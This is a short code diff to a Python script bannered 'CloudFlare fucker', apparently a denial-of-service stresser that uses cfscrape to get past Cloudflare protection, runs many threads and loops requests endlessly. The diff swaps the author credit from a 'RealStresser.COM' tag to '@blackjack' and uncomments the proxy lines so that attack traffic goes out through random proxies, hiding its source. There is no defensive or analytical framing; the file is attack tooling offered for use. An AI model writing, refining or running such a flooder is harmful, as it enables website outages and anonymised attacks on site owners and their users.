@@ -7,7 +7,7 @@ import requests
 import threading
 from colorama import Fore
 
-print(Fore.GREEN + "CloudFlare fucker by xr4zz3rs - RealStresser.COM")
+print(Fore.GREEN + "CloudFlare fucker by @blackjack")
 
 def Options():
     for a in range(thr):
@@ -45,8 +45,8 @@ def Attack():
 	proxy = random.choice(pprr).strip().split(":")
 	s = cfscrape.create_scraper()
 	s.proxies = {}
-	#s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
-	#s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
+	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
+	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
 	time.sleep(5)
 	while True:
 		while oo:
